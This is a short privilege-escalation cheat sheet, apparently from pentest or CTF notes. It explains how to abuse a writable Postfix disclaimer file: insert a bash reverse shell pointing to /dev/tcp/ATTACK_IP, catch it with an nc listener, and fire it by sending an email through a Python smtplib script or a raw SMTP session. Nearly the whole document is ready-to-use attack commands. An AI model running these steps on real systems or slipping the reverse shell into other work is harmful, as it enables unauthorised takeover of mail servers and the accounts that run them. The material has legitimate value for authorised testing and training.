# Postfix Privilege Escalation

## Requirements:

User has write access to the /etc/postfix/disclaimer file

### 1) Check which user executes code from the disclaimer file (to get the information of the user we are going to compromise)

    cat /etc/postfix/master.cf | grep disclaimer

### 2) Edit the disclaimer file by inserting a reverse shell

    nano /etc/postfix/disclaimer

Example

    #!/bin/bash
    # Localize these.
    bash -c 'bash -i >& /dev/tcp/ATTACK_IP/80 0>&1'

### 3) Setup listener

    sudo rlwrap nc -lvnp 80

### 4) Send an email to the SMTP server to force the disclaimer file to execute our code

sendmail.py

    import smtplib
    
    server = smtplib.SMTP("localhost",25)
    server.ehlo()
    server.sendmail("a@b.c","a@b.c","Hello")
    server.quit()

Then

    python3 sendmail.py

If there is no Python on the machine, send an email from your machine instead

    nc -v domain.local 25
    helo hacker
    MAIL FROM: sender@domain.local
    RCPT TO: victim@domain.local
    DATA
    Pwned!
    .
    quit
